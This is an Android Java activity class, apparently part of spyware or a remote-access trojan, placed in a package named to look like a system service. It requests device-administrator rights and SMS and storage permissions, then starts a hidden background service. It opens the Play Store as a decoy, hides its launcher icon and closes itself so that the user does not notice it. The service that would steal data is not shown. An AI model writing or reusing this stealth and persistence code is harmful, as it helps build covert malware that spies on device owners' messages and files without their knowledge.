package com.android.background.services;

import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import android.Manifest;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.provider.Settings;
import android.widget.Toast;

public class MainActivity extends AppCompatActivity {

    DevicePolicyManager devicePolicyManager;
    ComponentName componentName;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        componentName = new ComponentName(this, AdminReceiver.class);
        devicePolicyManager = (DevicePolicyManager)getSystemService(DEVICE_POLICY_SERVICE);

        if (!devicePolicyManager.isAdminActive(componentName)) {
            Intent intent= new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
            intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, componentName);
            intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, getString(R.string.device_admin_explanation));
            startActivity(intent);
        }

        if (
                ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED &&
                        ActivityCompat.checkSelfPermission(this, Manifest.permission.SEND_SMS) != PackageManager.PERMISSION_GRANTED &&
                        ActivityCompat.checkSelfPermission(this, Manifest.permission.RECEIVE_SMS) != PackageManager.PERMISSION_GRANTED &&
                        ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED
        ){
            Intent mIntent = new Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
            mIntent.setData(Uri.parse("package:"+getPackageName()));
            startActivity(mIntent);
            Toast.makeText(this, "Grant all permission before!", Toast.LENGTH_LONG).show();
        } else{

            Intent intent = new Intent( this, MainService.class );
            ContextCompat.startForegroundService(this, intent);

            openGooglePlay(this);

            if (Build.VERSION.SDK_INT < Build.VERSION_CODES.Q){
                hideIcon();
            }

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                finishAndRemoveTask();
            } else{
                finish();
            }
        }
    }

//-------------------------------------------------------------------------------------------------------------

    public static void openGooglePlay(Context context) {
        Intent GoogleIntent = new Intent(Intent.ACTION_VIEW, Uri.parse("https://play.google.com/store/apps"));
        context.startActivity(GoogleIntent);
    }
//_____________________________________________________________________________________________________________
    public void hideIcon() {
        getPackageManager().setComponentEnabledSetting(getComponentName(),
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP);
    }
}